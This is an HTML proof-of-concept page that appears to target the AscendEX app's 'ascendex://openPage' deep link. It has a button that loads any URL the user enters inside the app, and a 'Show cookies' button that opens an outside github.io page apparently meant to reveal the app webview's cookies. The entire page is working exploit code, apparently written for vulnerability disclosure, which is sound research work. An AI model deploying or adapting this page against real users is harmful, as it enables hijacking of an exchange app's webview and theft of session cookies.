<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
    body, html {
      height: 100%;
      margin: 0;
      display: flex;
      justify-content: center;  
      align-items: center;      
      background-color: #f0f0f0;
      font-family: Arial, sans-serif;
    }

    .center-button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .center-button:hover {
      background-color: #45a049;
    }
.center-url {
      padding: 15px 30px;
      font-size: 18px;
      border: 3px solid black;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s;
	
    }
  </style>
<script>
function conUrl(){
let url = document.getElementById("urlcon").value;
window.location = "ascendex://openPage?url="+url
}
</script>

</head>
<body>
<input type="url" class="center-url" placeholder="Enter your server url here" id="urlcon">
  <button class="center-button" onclick="conUrl()">
  Click Me
</button>
  <button class="center-button" style="margin-left: 7px;" onclick="location.href = 'ascendex://openPage?url=https://0xblaziken.github.io/poc/displayPoc.html'">
  Show cookies
</button>

</body>
</html>
